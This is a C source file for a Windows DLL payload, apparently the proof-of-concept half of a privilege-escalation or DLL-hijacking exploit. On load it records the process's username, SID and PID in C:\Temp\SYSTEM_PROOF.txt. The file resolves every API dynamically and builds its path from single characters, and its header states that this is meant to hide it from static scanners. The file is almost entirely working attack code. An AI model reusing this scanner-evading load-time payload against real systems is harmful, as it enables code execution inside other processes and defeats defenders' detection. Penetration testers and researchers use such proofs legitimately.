/*
 * payload.c - proof-of-SYSTEM DLL
 * Writes identity to C:\Temp\SYSTEM_PROOF.txt using only dynamic API calls.
 * No CreateProcess, no imports visible to static scanners.
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return TRUE;

    typedef HANDLE (WINAPI *FnCF)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
    typedef BOOL   (WINAPI *FnWF)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
    typedef BOOL   (WINAPI *FnCH)(HANDLE);
    typedef BOOL   (WINAPI *FnGUN)(LPWSTR,LPDWORD);
    typedef HANDLE (WINAPI *FnOPT)(HANDLE,DWORD,BOOL);
    typedef BOOL   (WINAPI *FnGTI)(HANDLE,TOKEN_INFORMATION_CLASS,LPVOID,DWORD,PDWORD);
    typedef BOOL   (WINAPI *FnCSS)(PSID,LPWSTR*);
    typedef HLOCAL (WINAPI *FnLF)(HLOCAL);

    HMODULE k = GetModuleHandleA("kernel32.dll");
    HMODULE a = LoadLibraryA("advapi32.dll");
    if (!k || !a) return TRUE;

    FnCF  fnCF  = (FnCF) GetProcAddress(k, "CreateFileW");
    FnWF  fnWF  = (FnWF) GetProcAddress(k, "WriteFile");
    FnCH  fnCH  = (FnCH) GetProcAddress(k, "CloseHandle");
    FnGUN fnGUN = (FnGUN)GetProcAddress(k, "GetUserNameW");
    FnOPT fnOPT = (FnOPT)GetProcAddress(a, "OpenProcessToken");
    FnGTI fnGTI = (FnGTI)GetProcAddress(a, "GetTokenInformation");
    FnCSS fnCSS = (FnCSS)GetProcAddress(a, "ConvertSidToStringSidW");
    FnLF  fnLF  = (FnLF) GetProcAddress(k, "LocalFree");
    if (!fnCF||!fnWF||!fnCH||!fnGUN||!fnOPT||!fnGTI||!fnCSS||!fnLF) return TRUE;

    /* Collect identity */
    wchar_t username[128] = {0}; DWORD ulen = 128;
    fnGUN(username, &ulen);

    wchar_t sidStr[256] = {0};
    HANDLE hTok = NULL;
    if (fnOPT(GetCurrentProcess(), TOKEN_QUERY, &hTok) && hTok) {
        DWORD cb = 0; fnGTI(hTok, TokenUser, NULL, 0, &cb);
        PTOKEN_USER pu = (PTOKEN_USER)LocalAlloc(LPTR, cb);
        if (pu && fnGTI(hTok, TokenUser, pu, cb, &cb)) {
            wchar_t *ps = NULL;
            if (fnCSS(pu->User.Sid, &ps) && ps) {
                DWORD i = 0;
                while (ps[i] && i < 254) { sidStr[i] = ps[i]; i++; }
                fnLF(ps);
            }
        }
        fnLF(pu); fnCH(hTok);
    }

    /* Write proof file */
    wchar_t path[] = {L'C',L':',L'\\',L'T',L'e',L'm',L'p',L'\\',
                      L'S',L'Y',L'S',L'T',L'E',L'M',L'_',
                      L'P',L'R',L'O',L'O',L'F',L'.',L't',L'x',L't',0};
    HANDLE hf = fnCF(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        char buf[512]; DWORD written;
        int n = wsprintfA(buf, "SYSTEM PROOF\r\nUser: %ls\r\nSID:  %ls\r\nPID:  %lu\r\n",
                          username, sidStr, GetCurrentProcessId());
        fnWF(hf, buf, (DWORD)n, &written, NULL);
        fnCH(hf);
    }
    return TRUE;
}
